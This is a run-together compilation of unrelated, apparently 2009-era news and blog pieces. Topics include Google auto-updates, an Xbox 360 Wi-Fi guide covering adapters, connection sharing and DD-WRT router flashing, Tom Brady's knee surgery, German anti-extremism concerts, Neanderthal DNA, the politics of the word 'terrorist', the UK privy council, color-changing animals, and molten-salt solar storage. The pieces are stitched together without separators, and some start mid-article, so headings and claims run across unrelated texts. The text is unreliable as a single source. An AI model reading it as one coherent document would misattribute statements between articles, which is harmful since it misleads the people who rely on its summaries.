We hate to break it to you Google , but you are n't special , and your software updates are no more critical than anyone else 's .
At the very least , offer users a way to turn off auto -updates .
The web may belong to Google , but your desktop and the applications running on it should remain in your control .

The Xbox 360 is the best console you can buy .
Except it 's inexplicably missing something the Wii and PS3 have : Wi -Fi .
You could buy Microsoft's $ 90 dongle .
Or you could follow our guide .

The Xbox 360's lack of Wi-Fi is a totally killer hardware flaw — if you 're not right on top of your router , you 've either gotta string miles of ethernet cable or buy that pricey ass dongle from Microsoft .
Unless you check out one of the cheaper alternatives .
Here 's every major way to get your Xbox going on Wi -Fi , sorted by easiest to hardest ( but most satisfying ) .

Donglage
Dongles are , by far , the easiest way to get your Xbox 360 on a wireless network .
But they also tend to be the priciest .
• Microsoft 's official wireless adapter is $ 87 , which is absolute horseshit for a Wi -Fi antenna attached to a USB cable .
But it looks the nicest and is super easy to use — just plug and play .
Update :
This weekend you can get one for $ 69 .
G/O Media may get a commission LG 75 - Inch 8K TV Buy for $ 2150 from BuyDig Use the promo code ASL250
• The next stop is a third - party wireless adapter , where you 've got your pick from Linksys ( $ 65 ) , Belkin ( $ 70 ) and hey , Linksys ( $ 90 , but it 's 802.11n ) .
Same deal , plug and play .
Advertisement
• Finally , your cheapest option is from ... Microsoft .
Turns out , a regular Xbox wireless adapter ( which is a supercheap $ 50 ) , works just fine , with a tiny bit of finagling :
Do n't put in its actual install CD .
Just plug it in , and set your encryption .
It might take two tries to get it to work , but it will .
And , it wo n't eat up a USB port like the official Xbox 360 one .
Spoiler alert :
This is our pick for best option , based on its combo of cheapness and convenience , if you can find one .

Share Your Computer 's Connection
Sharing your computer 's connection is the cheapest option — it 's actually the freest one .
It 'll work with a laptop or desktop , though a laptop is more truly wireless — the desktop bit is an option if your router 's just a step too far out of the way .
Basically , you 're plugging your Xbox into the computer 's ethernet port , and then having it use your computer 's wireless connection to connect to the internet .
Windows
It 's actually harder to reliably share the internet love on Windows with its cousin , the Xbox 360 , than it is on a Mac :
No method worked reliably for us across multiple Windows computers .
But here 's how it should work :
1 . Share your computer 's wireless connection .
Microsoft actually details the process here , and it 's pretty easy .
From the Network and Sharing center , click on the manage network connections option on the left .
From there , right click on the connect you wanna share ( probably wireless , unless you 're daisy - chaining ' cause your box just wo n't reach ) and hit properties .
Under the sharing tab , just check the box to allow that connection to be shared .
Plug your Xbox into the ethernet port .
Advertisement
2 . There are a few other ways to proceed at this point , and you 're probably going to have try at least a couple of them to find one that 'll work .
You could bridge the two connections ( dicey ) , or you could manually assign the ethernet port an IP address , detailed here ( PDF ) .
This Instructable relies on automagicalness to resolve the settings , and I have had that work in the past , though not when I was sorting through methods for this how to .
All in all , expect to do some Googling and troubleshooting if you go the Windows route .
Advertisement
Mac
You'd think this would be easy , ' cause I heard somewhere that Macs just work , and internet sharing on Macs typically ain't hard , but there is a tiny bit of jujitsu involved here .
This method , from Joystiq , is the most reliable one I used .
1 . On your Mac , pop open Terminal , and type " ifconfig en0 " ( number zero , no quotes ) .
A whole bunch of crap will pop up .
Find where it says " inet 192.xxx.x.xxx " ( it should be 192 , anyway ) .
Write that junk down .
It will probably be 192.168.2.1 , like mine .
Also find out your router 's IP address , which is most likely 192.168.1.1 ( Linksys ) or 192.168.0.1 ( D - Link uses this ) , depending on your manufacturer .
If you have Apple 's Airport gear , the router will be at 10.0.1.1 .
Advertisement
2 . Then plug your Xbox 360 into your Mac , open up Sharing in Preferences .
Turn on internet sharing , and share your Airport 's internet connection with ethernet .
3 . On the Xbox , flip to your network settings ( under system settings ) , and enter the IP address you got from the terminal freaky deaky earlier but + 1 , like 192.168.2.2 to my original 192.168.2.1 .
Subnet should be 255.255.255.0 , and then set your gateway as the ifconfig number , 192.168.2.1 .
Under DNS ( back one screen , then down ) , put in your router 's actual address for both .
Test your Xbox Live connection .
Your NAT might suck , but you can get on Xbox Live .

Hack Your Router
This method is the least straightforward , and requires a little bit of work on your part .
Essentially , you 're buying a second router ( a cheap one , for about $ 40 ) and installing custom software on it that turns it into a giant wireless antenna that 's hooked up to your Xbox 360 .

There are tons of Linux custom firmwares for routers nowadays , with DD - WRT and Tomato being the most popular .
Tomato is a bit more user friendly , but it works with far fewer routers than DD - WRT .
DD - WRT works with dozens of different routers ( click for the list ) .
Whichever firmware you go with , the method for putting on your router will vary from device to device , with Buffalo routers being a notorious pain in the ass .
Tomato includes instructions with the firmware download — but here are some of the details , and Lifehacker 's complete guide to installing and using Tomato .
Advertisement
DD - WRT is my preferred firmware .
Here are the detailed install instructions , but with most Linksys routers , you can just drill into the router settings from the web address ( 192.168.1.1 ) and upload the DD - WRT firmware , directly , making it pretty easy .
But some routers require different , exceptionally specific install methods .
So check out the list before you run out to Best Buy or Circuit City .
Advertisement
My preferred router for this because of its tininess and cheapness ( under $ 40 ) , was the Buffalo G - 125 , which required you to flash it over TFTP backdoor the DD - WRT firmware onto it during a brief window of time , like Luke dropping those bombs into the Death Star 's vent shaft .
It 's a pain in the ass , but everything else about the Buffalo routers make it worth it .
Unfortunately , you can't buy it in the States until the next month or so , so your cheapest bet is is Linksys 's $ 40ish WRT54G , which unfortunately , has different install methods depending on the revision .
The DD - WRT wiki is very good , so you should n't run into problems following it .
Advertisement
Once you get either firmware installed , you 're going to set your hacked router up as a wireless client .
1 . You 're going to need to go into the hacked router 's settings .
Set the hacked router to client mode .
Advertisement
2 . These numbers are going to vary slightly based on your router , but you need to assign it an IP address — if your main router 's IP address is 192.168.0.1 , set your hacked router at 192.168.0.2 or 192.168.0.101 ( a number that 's in your main router 's DHCP server range ) .
Then make the gateway and DNS the same IP address as your main router .
3 . When it reboots you 're gonna have to re-login to whatever IP address your hacked router is .
Do that , go back in , and give the hacked router the same SSID ( name ) as your main router ( Linksys , gizrox , whatever you have it named ) .
You can also configure wireless security at this point , though for me , it 's always been kind of flaky , WEP in particular , so you might have to play around to see what works .
Advertisement
4 . To test , try to get online using the hacked router as your internet connection , with all of your computer 's IP settings left on automatic .
If it works , plug the hacked router into your Xbox .
If not , check out the DD - WRT wiki for more halpz .
4 . On your Xbox , you can leave everything set to automatic — the hacked router does all the work .

The hacked router method might take the longest , but at least you wo n't have a useless dongle when the Xbox 720 comes out , you 'll have a full - featured router , and it 's cheaper than the official dongle .
Plus you 'll have a feeling of accomplishment that will carry over to gaming , so you should kill a lot more people in Call of Duty .
New England Patriots quarterback
Tom Brady has fallen behind in his recovery efforts from knee surgery and could risk missing next season if another operation is needed , NBCSports.com has reported .
Brady , who underwent surgery Oct. 6 after tearing the ACL and MCL ligaments in his left knee in the first quarter of the team 's first game of the season , had subsequent operations on the knee after it became infected .
That infection resulted in a buildup of scar tissue , which may require surgery on the knee , the Web site reported , citing an anonymous NFL source .
The scar tissue also has affected Brady 's ability to begin fully rehabilitating his leg , the report said , and the repaired ligaments remain loose .
Another surgery also could be needed for that condition , the Web site reported .
BERLIN ( Reuters ) - Young German musicians are protesting against a rise in neo -Nazi extremism with concerts and songs which they hope will turn voters away from right - wing parties in state polls and a federal election this year .
Far - right parties such as the National Democratic Party ( NPD ) made gains in last year ’s local elections in Germany and officials have warned that neo -Nazis are becoming increasingly violent .
“ Xenophobic organizations and their members are very active again .
They ’re trying to gain more influence for the elections , ” said Tina Bauer , spokeswoman for the “ Soundwahl ” music competition , which starts from Friday .
The project encourages young people from Berlin and the eastern state of Brandenburg to perform songs promoting tolerance and democratic values while speaking out against racism .
The best 16 songs will form a CD to be distributed free in schools in the region .
The winning bands will perform live concerts and run workshops tackling racism and discrimination with groups of young people .
“ We want to start a counter movement and give democracy a voice in Brandenburg .
And the best way to get through to young people is through music , ” Bauer said .
In 2009 there will be elections in five states , including Brandenburg , and a federal election is due to take place in September .

In the Neanderthal equivalent of the human genome project , scientists extracted and analysed ancient DNA from the fossil bones of three of the squat , thick - browed people who died out more than 30,000 years ago .
Neanderthals and our species split from a common lineage about 500,000 years ago , making these ancient people who lived in Europe and parts of Asia our closest known relatives .
Mike Bunce , of Murdoch University 's Ancient DNA Research Laboratory in Perth , said the research would help reveal what makes modern humans unique .
" It 's an amazing accomplishment . "
But it did not mean Neanderthals would be brought back from extinction any time soon , Dr Bunce said .
The case may be even more tangled with Hezbollah , which is credited across Lebanese factions with forcing Israel to abandon its 20 - year occupation of southern Lebanon , defeating Israel in a 2006 war and placing its members in Lebanon ’s government and Parliament .
“ If Obama thinks these organizations are terrorists , there will never be peace , ” said Hany Hassan , 29 , who was selling flowers from his uncle ’s shop in the quiet Cairo suburb of Maadi .
“ Bin Laden , he is a terrorist .
These organizations , if America thinks they are terrorists , they will have to convince us . ”
There are certain cases where there is a greater consensus over what is terrorism , such as the Sept. 11 attacks by Al Qaeda , the attack on a school in Beslan , Russia , bombings in Bali , Spain and London ( though even here , it is not unanimous ) .
But in this region , for example , the invasion of Iraq is often referred to as a terrorist act .
The issue of who is a terrorist often stirs strong emotions and fuels diplomatic conflicts .
Iranian officials , for example , recently excoriated ambassadors from the European Union for having removed the People ’s Mujahedeen Organization of Iran from the list of banned terrorist organizations .
Iran considers it a terrorist group committed to overthrowing the state .
“ The Islamic Republic of Iran strongly condemns the double standards of the European Union regarding the phenomenon of terrorism , ” Deputy Foreign Minister Mehdi Safari told the ambassadors in Tehran .
Ron Pundak , director of the Peres Center for Peace in Israel , said , “ I accept that Hamas and Hezbollah are terrorist organizations , but I think we should speak with them to pursue our objectives . ”
He acknowledged his view was out of sync with Israeli public opinion .
What has happened , he and other regional analysts said , is that the use of the term “ terrorist ” has become a simplistic point , counterpoint offensive of its own , reflecting the growing influence of radicalism on both sides .
It is often used to cloud issues , to avoid having to talk and to try to appear to take the moral high ground , they said .
Following my piece about terror searches near the Taking Liberties exhibition inside the British Library , I eventually received a statement from the British Library which regretfully does not answer the questions about privacy nor makes any comment about the irony of these searches taking place within whispering distance of a show devoted to freedom .
Nevertheless there is an admission that the searches were incorrect and this is important to people who wish to go the library without being challenged unnecessarily by the police .
The statement , issued by Miki Lentin , head of media relations , strategic marketing and communications of the British Library is as follows .
Monday 23rd February 2009 , two police officers from the Metropolitan police service approached British Library security staff at the front entrance and requested Miki Lenton that they could carry out stop and search with members of the public under the Terrorism Act .
The British Library 's own security services are responsible for ensuring the safety of our readers and the collections , and any police searches on our premises should be strictly and clearly voluntary .
It appears that the correct procedures were not followed in this case and we will be investigating this further .
It is the British Library 's policy to ensure the safety and security of our readers and collections at all times .
We operate random bag searches at the main customer and staff entrances to the building based on the security advice we receive on a regular basis from the Metropolitan police service .
Due to the British Library 's position within the King 's Cross area , as well as our proximity to one of the capital 's largest transport hubs , St Pancras , the British Library benefits from a proactive and supportive relationship with the Metropolitan police service .
Mr Lentin refused to add anything to this or comment on the unwitting irony of this lapse in the correct procedure .
Asked if this was because he was government servant , he declined to comment further .

SYNOPSIS
Lack of essential observations from space is currently a major limiting factor in many areas of geospace and atmospheric research .
Recent advances in sensor and spacecraft technolo­gies make it feasible to obtain key measurements from low - cost , small satellite missions .
A particularly promising aspect of this development is the prospect for obtaining multi-point observations in space that are critical for addressing many outstanding problems in space and atmospheric sciences .
Space - based measurements from small satellites also have great potential to advance discovery and understanding in geospace and atmospheric sciences in many other ways .
To take full advantage of these developments , NSF is soliciting research proposals centered on small satellite missions .
The overarching goal of the program is to support the development , construction , launch , operation , and data analysis of small satellite science missions to advance geospace and atmospheric research .
Equally important , it will provide essential opportunities to train the next generation of experimental space scientists and aerospace engineers .
To facilitate launch of the satellites as secondary payloads on existing missions , the focus of the program is on CubeSat - based satellites .
Launch of the satellites will mainly be through the standardized CubeSat deployment system , the Poly Picosatellite Orbital Deployer ( P - POD ) .
Launch of the P - PODS will be as auxiliary payloads on DOD , NASA , or commercial launches .
This will be arranged after selection and is not part of this solicitation .
This solicitation covers proposals for science missions to include satellite development , construction , testing and operation as well as data distribution and scientific analysis .

Have you seen advertisements for products such as coral calcium or alkaline water that are supposed to neutralize acid in your bloodstream ?
Taking calcium or drinking alkaline water does not affect blood acidity .
Anyone who tells you that certain foods or supplements make your stomach or blood acidic does not understand nutrition .
You should not believe that it matters whether foods are acidic or alkaline , because no foods change the acidity of anything in your body except your urine .
Your stomach is so acidic that no food can change its acidity .
Citrus fruits , vinegar , and vitamins such as ascorbic acid or folic acid do not change the acidity of your stomach or your bloodstream .
An entire bottle of calcium pills or antacids would not change the acidity of your stomach for more than a few minutes .
All foods that leave your stomach are acidic .
Then they enter your intestines where secretions from your pancreas neutralize the stomach acids .
So no matter what you eat , the food in stomach is acidic and the food in the intestines is alkaline .
Dietary modification cannot change the acidity of any part of your body except your urine .
Your bloodstream and organs control acidity in a very narrow range .
Anything that changed acidity in your body would make you very sick and could even kill you .
Promoters of these products claim that cancer cells cannot live in an alkaline environment and that is true , but neither can any of the other cells in your body .
All chemical reactions in your body are started by chemicals called enzymes .
For example , if you convert chemical A to chemical B and release energy , enzymes must start these reactions .
All enzymes function in a very narrow range of acidity .
( The degree of acidity or alkalinity is expressed as “ pH . ” ) .
If your blood changes its acidity or alkalinity for any reason , it is quickly changed back to the normal pH or these enzymes would not function and the necessary chemical reactions would not proceed in your body .
For example , when you hold your breath , carbon dioxide accumulates in your bloodstream very rapidly and your blood turns acidic , and you will become uncomfortable or even pass out .
This forces you to start breathing again immediately , and the pH returns to normal .
If your kidneys are damaged and cannot regulate the acidity of your bloodstream , chemical reactions stop , poisons accumulate in your bloodstream , and you can die .
Certain foods can leave end - products called ash that can make your urine acid or alkaline , but urine is the only body fluid that can have its acidity changed by food or supplements .
ALKALINE - ASH FOODS include fresh fruit and raw vegetables .
ACID - ASH FOODS include ALL ANIMAL PRODUCTS , whole grains , beans and other seeds .
These foods can change the acidity of your urine , but that ’s irrelevant since your urine is contained in your bladder and does not affect the pH of any other part of your body .
When you take in more protein than your body needs , your body cannot store it , so the excess amino acids are converted to organic acids that would acidify your blood .
But your blood never becomes acidic because as soon as the proteins are converted to organic acids , calcium leaves your bones to neutralize the acid and prevent any change in pH .
Because of this , many scientists think that taking in too much protein may weaken bones to cause osteoporosis .
Cranberries have been shown to help prevent recurrent urinary tract infections , but not because of their acidity .
They contain chemicals that prevent bacteria from sticking to urinary tract cells .
Taking calcium supplements or drinking alkaline water will not change the pH of your blood .
If you hear someone say that your body is too acidic and you should use their product to make it more alkaline , you would be wise not to believe anything else the person tells you .

Justice probe may pose ' enormous consequences ' for Bush officials David Edwards and Stephen C. Webster
Published : Tuesday February 17 , 2009

This A Department of Justice report has called into question the entire legal basis of the Bush administration 's repeated justifications of abusing prisoners captured in the former president 's terror war .
According to Monday night 's guest on MSNBC's The Rachel Maddow Show , the " consequences " of some of the report 's findings could be " enormous " for members of the Bush administration .
A draft of the report from the Office of Professional Responsibility , the department 's watchdog unit , was submitted during the waning days of the Bush administration , but former Attorney General Michael Mukasey objected to it , according to a Monday report by Newsweek reporter Michael Isikoff .
" The [ Justice Department ] report is expected to focus on three former officials of the Office of Legal Counsel , the Justice Department office that advises the executive branch on the interpretation of the law , " reports the International Herald Tribune .
" They are John Yoo , a Berkeley law professor , now a visiting professor at Chapman University , who was the primary author of opinions on torture while at the counsel 's office in 2002 ; Jay Bybee , now a judge on the U.S. 9th Circuit Court of Appeals , who as head of the office signed the 2002 opinions , which were later withdrawn ; and Steven Bradbury , who wrote three more still - secret opinions on interrogation in 2005 , when he was the top lawyer in the counsel 's office . "
Mukasey and his deputy wanted the report to contain responses from Bybee and Yoo , along with Steven Bradbury , chief of the Office of Legal Counsel ( OLC ) , at the time the report was submitted .
The OPR is now working to include the ex-officials ' responses before presenting a final version to Attorney General Eric Holder Jr. If Holder accepts the report 's findings , it could be forwarded to state bar associations which may choose to disbar the attorneys .
On Monday night 's The Rachael Maddow Show , Isikoff took time to shed additional light on the subject , offering several stark possibilities .
" Bush interrogation policy was based on not just shoddy legal analysis , but unprofessional and potentially unethical legal analysis , " he said , noting that he has not yet seen the full report .
" But the consequences of such a finding would be enormous , " continued Isikoff .
" Not just for those lawyers , but for the whole argument of whether there should be a ' truth commission ' or continued investigations .
" Remember , the pushback against that has always been , ' Well , there were valid , legal memos from the Justice Department that justified waterboarding . '
Now , if these legal memos are called into question , that changes substantially the equation . "
The most recent high - profile airing of the justification Isikoff mentions came during CNN's Larry King interview with President Bush , which aired Friday , Feb. 13 .
In his interview with CNN's Larry King , Bush said , " Everything we did was -- you know , it had legal -- legal opinions behind it .
Look , you 're sitting there , you 've captured Khalid Sheikh Mohammed .
He 's the guy that ordered the September the 11th attacks .
And we want to know what he knows in order to protect the United States of America .
And I got legal opinions that said whatever we 're going to do is legal .
And my job is to protect you , Larry .
And I 've given it my all .
I 've given it my all . "
" If it turns out that those memos are bunk , that they might get their authors disbarred or something , does that actually materially change that as a legal defense though , to prosecution ? " asked Maddow .
" Or does that only change the political calculation about prosecuting ? "
" Well , it certainly changes the political calculation , " said Isikoff .
" And it probably does not change the calculation for say , CIA officers who were relying on these memos .
But what 's really interesting about this report is -- and this investigation , is -- they just did n't reach a legal conclusion .
" I talked to a number of Bush administration lawyers who'd been questioned as part of this .
And they said the OPR investigators who did this report got internal e-mails , internal drafts , of back and forth correspondence with the White House to reconstruct how these memos came to be crafted .
" And if , in fact , it 's shown essentially senior officials in the Bush administration at the White House and others were dictating and in collusion with the lawyers with the Justice Department to sort - of predetermine what the outcome was , then , in fact , the look into how these memos , could go elsewhere ;
It could go beyond just the authors of these memos into the people who ...
Into the clients they were seeking to please . "
" On his second full day in office , President Barack Obama instructed officials not to rely on any opinions on interrogation issued by the Justice Department since 2001 , " noted the Herald Tribune .

Big food companies were not the only ones troubled by the peanut recall .
Small businesses in all corners of the United States bought potentially tainted peanut products from the Peanut Corporation of America and are now part of one of the largest food recalls ever in this country .
There is the chef in Las Vegas , for instance , who used them in protein bars , the packager of nuts and dried fruits in Connecticut , the cannery in Montana that sold chocolate - covered nuts and the ice cream manufacturer in New York State .
In all , more than 2,100 processed and packaged foods have been recalled in the wake of a salmonella outbreak linked to the Peanut Corporation ’s products .
More than 660 people became ill , and infection may have contributed to nine deaths , the Centers for Disease Control and Prevention reported .
The recall opens a window not only onto the ubiquity of peanuts in food , but also into the complexity of the nation ’s food system .
Without the resources of big companies , small businesses have a particularly difficult time navigating that system .
Even the businesses that thought they had complied with food safety practices ended up with potentially tainted products .
And now , in dealing with the recall , they are at a continued disadvantage .
While big companies like Kellogg , Kraft and General Mills have the experience and staff to handle recalls , many small businesses have never had to deal with anything like this .
There is a modern - day ghost story at the heart of the British political system .
Admittedly there are probably several , but this one is of the more stunning variety .
Lord Roskill , when confronted with its murky depths in 1985 , could hear : " the clanking of medieval chains of the ghosts of the past ... the anarchism of past centuries . "
What is it ?
Here are some clues .
It 's a bit like a private members ' club .
To join it , you have to take an oath that you will " to your uttermost bear Faith and Allegiance to the Queen 's Majesty ; and assist and defend ... against all Foreign Princes " .
Your membership will be for life and you will " enjoy precedence following Knights of the Garter and of the Thistle , next after the eldest sons of barons " .
Your background is likely to be a close relative of the Queen , a " noblemen of high rank " , a " person eminent in science or letters " , an archbishop or maybe just someone owed a favour by the government of the day .
And best of all , you will get to pass laws without being inconvenienced by the interference of a democratically elected parliament , for example .
Welcome to the privy council – a body so obscure that it makes the House of Lords seem positively modern .
The Lords may get to amend laws , financial inducements notwithstanding – this lot get to actually pass them , and no one even knows who they are .
Even the recent meticulous attempt to lay bare what the privy council actually does , in a recently released report by QC Patrick O'Connor , left some of the mystery intact .
It 's difficult to explain what the privy council does because it 's not exactly written down anywhere .
It has more or less " evolved " ( although that seems like a generous concept to apply in this context ) since the Norman and Plantagenet kings of the 12th century .
In those days , the monarch exercised real political power , and needed a council of advisors to help him decide how to use it .
And who better to provide that advice in medieval England than a council of bishops , peers and knights ?
The thing is , in 2009 , a glorious revolution later , not to mention the general acceptance of such concepts of universal suffrage , democratic elections and accountable government , the privy council is still full of bishops , peers and knights .
These days , mainly as a result of those developments , the idea of the Queen exercising any of her prerogative powers ( constitutionally she still has an impressive range of them ) personally , is unthinkable .
It would n't be illogical to assume that as a result , the privy council would be rendered redundant .
Instead , it is far from redundant .
It has essentially become a mechanism for the government , which exercises the Queen 's legal powers on her behalf , to make decisions away from public scrutiny .
Many of these powers are random and unlikely to be fought over by any other part of the state .
Proclaiming the dates of bank holidays , deciding on the closure of burial grounds , appointing a new chairman of the BBC – well , maybe not so much the last one .
But others , known as prerogative " orders in council " give the privy council the power to make laws .
These laws , which have the same status as primary legislation , are often the kind that would probably have a hard time if parliament – who we elected , by the way – were ever able to get their hands on them .
Evicting inhabitants from an island off the coast of Mauritius in return for some missile deal with the US .
Banning union membership among civil servants .
Freezing the bank accounts and controlling the expenditure of British citizens and their families without any judicial oversight .
These are not the kind of issues that would go unnoticed in the Commons .
Even the judicial committee of the House of Lords felt " judicial distress and indignation " when confronted with the sheer unaccountable audacity of this power .
This is not to say the privy council is without its charm .
It 's hard not to be amused at the idea of newly initiated cabinet members spending over an hour at Buckingham Palace rehearsing how to stand , kneel , raise right hands and retreat , or marvel at the obscurity of the annual ceremony of " pricking the sheriffs " with a bodkin – I have no idea what this means but it is one of the reasons that O'Connor 's report makes such good reading .
But ceremony aside , it 's hard to imagine there is anything about the privy council 's law - making powers remotely consistent with modern democracy .
Labour , before they came into power , appear to have agreed .
Maybe when they realised how convenient it is to make laws without the hassle of parliament getting involved , they changed their minds .
It 's hard to imagine now however , that an organ of state so opaque that the House of Lords is utterly transparent by comparison , can really survive intact .
Can you spot the animals in the images above ?
The lizard blends so perfectly it is hard to see even when pointed out .
The ability to change color seems like an animal superpower at times – some of them can alter their appearance to blend with the colors , materials and textures of virtually any surroundings .
For some this ‘ costume change ’ happens quickly , for others it is seasonal – for many it helps them avoid predators , for a few it enables them to sneak up on prey .
Culled from around the animal kingdom , here are seven of most impressive color - changing species in the world .

The flounder at first appeas as rather ungainly - looking bottom - feeding flat fish , but has the amazing ability to adapt their appearance to their environment in search of prey along the ocean floor .
To further aid their stealth , their second eye actually migrates to one side of their body ( left or right depending on the species ) as they get older .
This enables them to cruise along parallel to the ground below them ( essentially on their side ) and still look up and forward .
Further , these industrious creatures have even ( surprisingly ) been found at the bottom of deepest location on the Earth ’s crust – the Mariana Trench – at depths of 35,000 feet .

More than mere color - changers , Mimic Octopi are also shape - shifters that can adapt their movements and the arrangement of their parts to appear as up to 15 different oceanic species “ including sea snakes , lionfish , flatfish , brittle stars , giant crabs , sea shells , stingrays , flounders , jellyfish , sea anemones , and mantis shrimp . ”
This remarkable octopus species determines threats and reacts by appearing as a predator to their own predators .
“ For example , when the octopus was being attacked by damselfishes , it was observed that the octopus appeared as a banded sea snake , a damselfish predator .
The octopus impersonates the snake by turning black and yellow , burying six of its arms , and waving its other two arms in opposite directions ” as shown in the above video .

Chameleons are the classic color - changers : all species of chameleons can shift their appearance to different degrees , collectively able to turn pink , blue , red , orange , yellow , green , black and brown and combinations thereof .
Unlike many color - changing creatures , chameleons are thought to mainly change in order to communicate with others of their species and to make themselves more attractive to mates – as opposed to using their ability for offense or defense .

The Goldenrod Crab Spider only has two colors it can change into – white and yellow – but fortunately for it , this species hunts mainly on flowers of those colors : daisies and sunflowers most notably .
Triggered by their visual input , the spiders secrete a pigment to switch between white and yellow over a period of days – thus adapting to the plants in their area .
This color change both helps them sneak up on flower - sitting prey and to avoid aerial predators such as birds .

The Peron ’s Tree Frog – also known as the Laughing Tree Frog and Maniacal Cackle Frog – is notable for the high - pitched sound it generates but also for its amazing ability to change color in less than an hour .
It shifts between gray , brown and white with typically yellow and black legs and emerald spots .
They are not afraid of people and can be found in all kinds of environments around Australia , many close to civilization , where they thrive in part due to their color - changing camouflage .

You may have already seen a Golden Tortoise Beetle but not have realized it , since these remarkable creatures can change from a shiny gold color to a dull red with ladybug - like spots .
They achieve this change by altering the reflectivity of their outer shell – essentially like tinting a window – via microscopic valves that alter the moisture level under the shell .
While it is not known for sure , there must certainly be advantages to appearing as part of another commonly - found species .
From foxes and caribou to weasels , birds and bunnies , a number of species shift the colors of their coats come wintertime to blend in with the surrounding environment – a few are predators but most are prey .
The degree of their transformation depends heavily on their habitats and the particular species with some shifting only slightly between shades and others going from fully brown to entirely white .

A man climbed over two 10 - foot barb - wired electrified fences surrounding the Kingsnorth coal - fired power plant in England on November 28th and proceeded to enter the facility and shut down the plant ’s smokestack .
The entire ordeal was caught on security cameras , but no one — neither activists nor police — know who the man is or where to find him .
[ social_buttons ]
The action shut down the plant for four hours , causing the 500 megawatt facility to lose enough electricity to power a small town .
Experts estimate that England ’s carbon footprint decreased by a giant 2 percent while the plant was disabled .
“ It was extremely odd indeed , quite creepy .
We have never known anything like this at all , but it shows that if people want to do something badly enough they will find a way , ” said Emily Highmore , a spokesperson for E.
On , the company that owns the plant .
The man left a small banner reading nothing but “ No New Coal . ”
Kingsnorth has been target of many protests over the past year after E.
On gained approval to build a new coal plant in the region .
Greenpeace most recently occupied the plant for nearly a day and projected video evidence of global warming onto the plant .

For the second time in a week , the Attorney - General has been forced to announce in the House that a key piece of government legislation is inconsistent with the Bill of Rights Act [ PDF ] .
This time its the Sentencing and Parole Reform Bill , which would implement ACT 's " three strikes and you 're in " policy by imposing a mandatory sentence of life imprisonment with a 25 - year non-parole period for a third specified violent offence .
Where this would be " manifestly unjust " , the court may impose a shorter non-parole period , but must still sentence the offender to life imprisonment .
The problem , of course , is that in many cases this sentence will be grossly disproportionate to the offence - and so outrageously so as to violate the BORA ban on disproportionately severe treatment or punishment ( to which the normal " justifiable limitations " clause does not apply - there being no conceivable justification for torture , cruelty , or grossly disproportionate punishment ) .
Even in cases of " manifest injustice " , the law requires the courts to confirm rather than mitigate that injustice .
In addition ,
Absent manifest injustice [ and even with it in most cases - I/S ] , the sentencing court is obliged to impose a sentence on a qualifying offender that may be significantly more severe than that imposed on a more culpable , but non-qualifying , offender .
As a result , the scheme does not ensure a consistently rational connection between the offence and the penalty .
Instead , the Attorney - General points out that every specified offence is already subject to a possible sentence of preventive detention .
Preventive detention is itself a violation of the BORA ban on arbitrary detention - but what 's scary is that this proposed scheme makes it look good by comparison .
At least with preventative detention the courts have to be satisfied of a significant and continuing risk of reoffending ; here , they just have to say " you 're a crim " , and that 's the end of it .
So far , the courts have been reluctant to make declarations of inconsistency .
But this law , engaging as it does a key part of the BORA which does not permit " justified limitations " , seems designed to force them to it .
This is a bad law .
it violates the BORA , it violates our international obligations under the ICCPR , and it violates basic standards of justice and decency .
Instead , we seem to be codifying savagery and cruelty .
Draco would be proud .
The “ For Sale ” signs are just starting to sprout , but already experts worry that this spring home - buying season will be even grimmer than the last .
Despite tentative signs of recovery in hard - hit areas like California and Florida , the broader housing market is far from reaching bottom , economists say .
Across much of the nation , prices are likely to keep falling into 2010 .
So this March - to - June season , when most homes are bought and sold , will be bad , perhaps the worst since the market began to spiral down in 2006 .
Across the nation , 19 million houses and apartments — nearly one out of every seven — are vacant , the highest percentage since the 1960s .
But only about six million of those homes are for sale or for rent .
That means millions more could still flood onto the market , depressing prices further .
Near Granada , Spain , more than 28,000 metric tons of salt is now coursing through pipes at the Andasol 1 power plant .
That salt will be used to solve a pressing if obvious problem for solar power :
What do you do when the sun is not shining and at night ?
The answer : store sunlight as heat energy for such a rainy day .
Part of a so - called parabolic trough solar - thermal power plant , the salts will soon help the facility light up the night — literally .
Because most salts only melt at high temperatures ( table salt , for example , melts at around 1472 degrees Fahrenheit , or 800 degrees Celsius ) and do not turn to vapor until they get considerably hotter — they can be used to store a lot of the sun 's energy as heat .
Simply use the sunlight to heat up the salts and put those molten salts in proximity to water via a heat exchanger .
Hot steam can then be made to turn turbines without losing too much of the original absorbed solar energy .
The salts — a mixture of sodium and potassium nitrate , otherwise used as fertilizers — allow enough of the sun 's heat to be stored that the power plant can pump out electricity for nearly eight hours after the sun starts to set .
" It 's enough for 7.5 hours to produce energy with full capacity of 50 megawatts , " says Sven Moormann , a spokesman for Solar Millennium , AG , the German solar company that developed the Andasol plant .
" The hours of production are nearly double [ those of a solar - thermal ] power plant without storage and we have the possibility to plan our electricity production . "
Using mirrors to concentrate the sun 's energy is an old trick — the ancient Chinese and Greeks both used it to start fires — and modern power plants employing it might provide a significant source of renewable energy without any greenhouse gas emissions .
That is a step forward in its own right , but such power plants are limited to generating energy only when there is sunshine .
So engineers have tried a number of different technologies to store the sun 's energy so that such power plants can be more broadly employed .
They have tried batteries but too much of the energy that goes in is not returned , and they tend to be too expensive , according to an analysis from the National Renewable Energy Laboratory ( NREL ) in Golden , Colo .
Compressing air or pumping water uphill are more promising , but the opportunities to do that are limited by the number of caverns and the availability of water and reservoirs .
Melting salts at temperatures above 435 degrees Fahrenheit ( 224 degrees Celsius ) , however , can deliver back as much as 93 percent of the energy , plus the salts are ubiquitous because of their application as fertilizers .
" There 's a term called round - trip efficiency .
Basically , it 's a measure of how much electricity is produced if the thermal energy that 's generated is first stored and then used compared to just directly taking the energy .
That number is around 93 percent , " explains NREL senior engineer Greg Glatzmaier .
" [ For ] things like compressed air and mechanical type storage , there 's more significant losses , " an average of at least 20 percent over all the various technologies .
The Andasol 1 power plant , which cost around $ 380 million ( 300 million euros ) to build , is the first to actually use the technology , so it remains to be seen how it will work in commercial practice .
But U.S. government laboratories — NREL as well as Sandia National Laboratory in Albuquerque , N.M. — have already proved the technology can work in demonstration projects that employed it , like the Solar Two power tower outside Barstow , Calif .
Solar Millennium is so confident the technology will work that a twin solar - thermal power plant ( Andasol 2 ) is already near completion .
" It will start operations at the beginning of summer — May or June , " Moormann says .
And Arizona Public Service Co. ( APS ) has contracted with Abengoa Solar to build a 280 - megawatt solar thermal power plant — dubbed Solana or " sunny place " — 70 miles ( 110 kilometers ) southwest of Phoenix on nearly 2,000 acres ( 800 hectares ) of land .
